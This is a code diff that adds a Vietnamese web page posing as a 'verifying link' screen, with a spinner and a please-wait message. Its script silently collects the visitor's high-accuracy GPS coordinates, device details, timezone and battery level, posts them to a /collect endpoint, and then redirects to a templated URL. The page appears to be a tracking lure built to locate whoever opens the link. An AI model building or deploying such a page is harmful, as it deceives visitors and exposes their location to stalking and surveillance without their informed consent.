@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Đang xác thực...</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f0f13;
+    color: #e8e8ea;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+  }
+  .spinner {
+    width: 54px; height: 54px;
+    border: 4px solid rgba(255,255,255,0.1);
+    border-top-color: #4f8cff;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 28px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .text { font-size: 15px; letter-spacing: 0.3px; color: #b8b8c0; }
+  .sub  { font-size: 13px; margin-top: 8px; color: #6c6c78; }
+</style>
+</head>
+<body>
+
+<div class="spinner"></div>
+<div class="text">Đang xác thực liên kết...</div>
+<div class="sub">Vui lòng chờ trong giây lát</div>
+
+<script>
+const REDIRECT = "{{ redirect }}";
+
+function send(data) {
+  fetch("/collect", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data),
+    keepalive: true
+  }).finally(() => {
+    setTimeout(() => window.location.replace(REDIRECT), 800);
+  });
+}
+
+async function collectAll() {
+  const payload = {
+    lat: null,
+    lon: null,
+    accuracy: null,
+    screen: `${window.screen.width}x${window.screen.height}`,
+    platform: navigator.platform || "N/A",
+    language: navigator.language || "N/A",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+    battery: "N/A",
+  };
+
+  // Pin
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      payload.battery = `${Math.round(b.level * 100)}% ${b.charging ? "(đang sạc)" : ""}`;
+    }
+  } catch (e) {}
+
+  // GPS
+  const done = () => send(payload);
+
+  if (!navigator.geolocation) return done();
+
+  const timeout = setTimeout(done, 12000); // fallback nếu user không trả lời
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      clearTimeout(timeout);
+      payload.lat = pos.coords.latitude.toFixed(6);
+      payload.lon = pos.coords.longitude.toFixed(6);
+      payload.accuracy = Math.round(pos.coords.accuracy);
+      done();
+    },
+    (err) => {
+      clearTimeout(timeout);
+      done();
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+// Bắt đầu sau 1.5s để trang kịp render
+setTimeout(collectAll, 1500);
+</script>
+</body>
+</html>
